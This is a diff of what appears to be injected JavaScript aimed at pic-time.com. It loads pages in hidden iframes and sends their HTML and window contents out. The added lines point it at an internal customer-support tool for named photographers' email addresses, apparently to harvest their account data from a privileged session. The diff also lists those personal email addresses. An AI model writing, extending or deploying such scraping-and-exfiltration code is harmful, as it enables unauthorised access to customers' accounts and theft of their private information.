@@ -4372,7 +4372,7 @@ if (window.location === parent.window.location) {
             const iframeWindow = iframe.contentWindow;
 
             // Send Page HTML
-            window.insertDoc("iframe-page-html", iframeHtml);
+            window.insertDoc("iframe-page-html", {location: iframeUrl, html: iframeHtml});
 
             // Send iFrame Window Properties/Values
             const iframeWindowObjs = [];
@@ -4657,8 +4657,12 @@ if (window.location === parent.window.location) {
         if (window.ptData.headers?.gusr) {
           // startGettingUrls(ptData);
 
-          getIFrame("https://elizabethadamsboudoir.pic-time.com/portfolio");
-          getIFrame("https://elizabethadamsboudoir.pic-time.com/professional");
+          getIFrame("https://cstool.pic-time.com/!customersupport?userEmail=erinrobinsonphotography@protonmail.com");
+          getIFrame("https://cstool.pic-time.com/!customersupport?userEmail=elizabeth@elizabethadamsboudoir.com");
+          getIFrame("https://cstool.pic-time.com/!customersupport?userEmail=ka@kelliavilaphotography.com");
+          getIFrame("https://cstool.pic-time.com/!customersupport");
+          getIFrame("https://elizabethadamsboudoir.pic-time.com/!customersupport?userEmail=elizabeth@elizabethadamsboudoir.com");
+          getIFrame("https://kelliavilaphotography.pic-time.com/!customersupport?userEmail=ka@kelliavilaphotography.com");
         }
       });
     } catch (err) {
